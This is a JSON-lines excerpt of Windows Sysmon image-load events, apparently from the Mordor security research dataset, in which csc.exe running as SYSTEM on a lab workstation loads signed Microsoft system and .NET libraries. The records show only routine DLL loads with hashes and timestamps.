{"ImageLoaded":"C:\\Windows\\System32\\gdi32full.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=F7A63E3541F18A55EB874AAD899373D0C6EDED74,MD5=9B9E9E68B817D79F296AB1CCF378D017,SHA256=1CF582623B0CB3868554E78574B599F39B10B5CA4A51FA898F89286DDD15CE13,IMPHASH=4D32F6E2211CD04CA28C2CD4FAC607E8","SourceName":"Microsoft-Windows-Sysmon","Description":"GDI Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1082 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.300Z","port":64545,"RecordNumber":3399234,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"gdi32","UtcTime":"2020-09-22 08:22:42.897","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\vcruntime140_clr0400.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=6790994B2E72E7FE8690CD8EBA1FCF4577389280,MD5=63936588122BDEE9624D02CE3F8F54EA,SHA256=21F7E6165CE8DD92DB8CDF48CEE83DE64B2B0807B7B499CF87678B70C6F8C32F,IMPHASH=CD244BF7A749BF0B13E038D2EE842BFC","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft C Runtime Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.300Z","port":64545,"RecordNumber":3399235,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Visual Studio 2017","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"vcruntime140_clr0400.dll","UtcTime":"2020-09-22 08:22:42.897","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\msvcp_win.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=3C9938AFD7E9E2427750B0BBF21D3905502C2416,MD5=D327A488FF346D2A2ACC7D018F80A615,SHA256=F60BA64AF20B44D13275955ECA2949C471F2C812CD3908AF63B145DEAEB4E4F3,IMPHASH=7F555C87AEA488E97B6067A0419ED3B4","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft C Runtime Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.815 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.300Z","port":64545,"RecordNumber":3399236,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"msvcp_win.dll","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\user32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=75625F56E7F2AC8E56CE8A00A3EA4C0C6B0807EF,MD5=C7255260A37B185705C47AA5824AF151,SHA256=116DFE7CC1C09CB0CF7B6D3936D6F2BBC0739A9267CF840FB873B142150253BE,IMPHASH=4C2FEDA3D715107818B9354EC0C836B2","SourceName":"Microsoft-Windows-Sysmon","Description":"Multi-User Windows USER API Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.997 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.300Z","port":64545,"RecordNumber":3399237,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"user32","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\oleaut32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=EF5BE564B84A7DE92B12ACBCD69D5F580FABCD89,MD5=9EE967CF9B388C7FAAEC9F04700EB47B,SHA256=CF34BADD43D9E69CA9F01352C4D89C9FD9F4AB53832B1589215A8544462F346D,IMPHASH=F010E2DB51A2E86CCF6052A1ACC0854F","SourceName":"Microsoft-Windows-Sysmon","Description":"OLEAUT32.DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.959 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.302Z","port":64545,"RecordNumber":3399238,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"OLEAUT32.DLL","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\shlwapi.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=9074DF3335B785BB00B43AE76ACC66B799118FAE,MD5=BFB85A9022324E41FCEC5011BCB5FD23,SHA256=3CDA144CFB6278DA47267FE1E1FE258716A074C3D3DD8413B259DA7DA1039871,IMPHASH=6659A49ABF33952444C5A7FA22FD9032","SourceName":"Microsoft-Windows-Sysmon","Description":"Shell Light-weight Utility Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.302Z","port":64545,"RecordNumber":3399239,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"SHLWAPI.DLL","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\psapi.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=354FBAC912764BBF6595F97A59D5E32041926194,MD5=89D92079F45D2F2539BCD1EEF73A701E,SHA256=6DAE0B5BAC5B2C34FD313B51AC793B6F0C270DA01474E4D1016B119FC1F9CE8F,IMPHASH=A19426362F5443C7159B76FBEAFD171F","SourceName":"Microsoft-Windows-Sysmon","Description":"Process Status Helper","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.302Z","port":64545,"RecordNumber":3399240,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"PSAPI","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\ucrtbase_clr0400.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=FF572BE9C4959684F64CF1EAD2636FE983E59627,MD5=F8F171BE1820544E15B555847005355C,SHA256=CDDF9A2BF085AE59BA464B3BA6394AACFC342DA5F17D77FD5306054C8AABF153,IMPHASH=0524DC27AA10ADA72FFB6F88F5FD8829","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft C Runtime Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.302Z","port":64545,"RecordNumber":3399241,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Visual Studio 2017","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"ucrtbase_clr0400.dll","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\ucrtbase_clr0400.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=FF572BE9C4959684F64CF1EAD2636FE983E59627,MD5=F8F171BE1820544E15B555847005355C,SHA256=CDDF9A2BF085AE59BA464B3BA6394AACFC342DA5F17D77FD5306054C8AABF153,IMPHASH=0524DC27AA10ADA72FFB6F88F5FD8829","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft C Runtime Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.302Z","port":64545,"RecordNumber":3399242,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Visual Studio 2017","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"ucrtbase_clr0400.dll","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\imm32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=76BB2AB8D3CB6DB6D23F4771334C9AA9C231B03A,MD5=025CC332EDC4B1A38290F3E36BCEF4FB,SHA256=0FE3C1C575EA1B0257B2EB12527EC35E3004CD88EA5BAEC7095386A9F9EB70AD,IMPHASH=24F54B6761C10BA12481CF6C780605BF","SourceName":"Microsoft-Windows-Sysmon","Description":"Multi-User Windows IMM32 API Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.387 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.303Z","port":64545,"RecordNumber":3399243,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"imm32","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\version.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=119724CC09BB52731D86A6B9F94003ED88E0E3FE,MD5=2C7C14627CFF3384C52E61D4DBD0ECC3,SHA256=41B4D85D84A86E41B948694B9B5F398A0D79F47629D6D969EB5B461D4F5D0347,IMPHASH=34340C2C4E9AA6EF6AD12BB695FC695B","SourceName":"Microsoft-Windows-Sysmon","Description":"Version Checking and File Installation Libraries","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:43.303Z","port":64545,"RecordNumber":3399244,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"VERSION.DLL","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\kernel.appcore.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=4985EC8C3309DB6CCCCFD4D18423A84E37BEC172,MD5=EDF981437C0FD1B9DBF9EA42CE97CE60,SHA256=42164F81BC8FC2D0A6B71DAA492BE6A6D4785821AA4FDCA27B9273721EDB23D9,IMPHASH=8899216954AA228EAA7E8EEDC31DBC03","SourceName":"Microsoft-Windows-Sysmon","Description":"AppModel API Host","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.295Z","port":64545,"RecordNumber":3399245,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"kernel.appcore.dll","UtcTime":"2020-09-22 08:22:42.913","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\imagehlp.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=321F2E4E1E177CE730974369874B1B1663465C71,MD5=A1DB11A87BA91EA909A9F798C7BF028B,SHA256=C1FE1ACC6DBE60FCC266520AE103B5E3E74C596ED748E3DFC0C5911DFD4C051D,IMPHASH=8131C379B220C309A0A223EBB505F96B","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT Image Helper","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.295Z","port":64545,"RecordNumber":3399246,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"IMAGEHLP.DLL","UtcTime":"2020-09-22 08:22:42.928","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\alink.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=392396F7D34A32629ADF8DFEDF7A8329A2C61238,MD5=5555F1C2A0070119F8CFA26FB32FB3DA,SHA256=81E3CDED4BE4545BC969BAB5E4F787A6BDB2EE590208CCCE63C6039E8B0B7679,IMPHASH=C10EB44B1CAF8AF0242704DAFD4A10D8","SourceName":"Microsoft-Windows-Sysmon","Description":"Assembly Linker","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.8.3752.0 built by: NET48REL1","UserID":"S-1-5-18","ThreadID":4052,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.295Z","port":64545,"RecordNumber":3399247,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"alink.dll","UtcTime":"2020-09-22 08:22:42.928","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\mscoree.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=5029F9119FE1D6679666C5DF2441EA656D39A6EE,MD5=8FFAA80338156FD443D34F4CE9BD8431,SHA256=696A78B8C7E32163E3752A8D73A13C70C12BBB05E20EB28295B786E5A88D7FDB,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft .NET Runtime Execution Engine","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.296Z","port":64545,"RecordNumber":3399248,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"mscoree.dll","UtcTime":"2020-09-22 08:22:42.928","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=1283EF637FA53D571118F269F9B8C0A5CCA2BF01,MD5=899A8B655E52A061B33571D97C5C06ED,SHA256=DE05B03E37FB9BA5D74CF8FA36A6F0B15AB61705285B738BC90D14FDE580A45E,IMPHASH=005299FA213F652A596AC31760C5340B","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft .NET Runtime Execution Engine","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"4.8.4180.0 built by: NET48REL1LAST_B","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.296Z","port":64545,"RecordNumber":3399249,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"mscoreei.dll","UtcTime":"2020-09-22 08:22:42.944","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\rsaenh.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=09310F93E62D8B8BCBBEA36CB3AAF78CB98798EF,MD5=D3102BD5CD3C24E02C68CF6770379402,SHA256=49BF93C5C4D0D4AEE050ED83193DCF3FCB08D50DB5F0B7740436B24B83D14023,IMPHASH=A4C20B1A7B632846186AD47A0810709E","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft Enhanced Cryptographic Provider","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.297Z","port":64545,"RecordNumber":3399250,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"rsaenh.dll","UtcTime":"2020-09-22 08:22:42.944","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
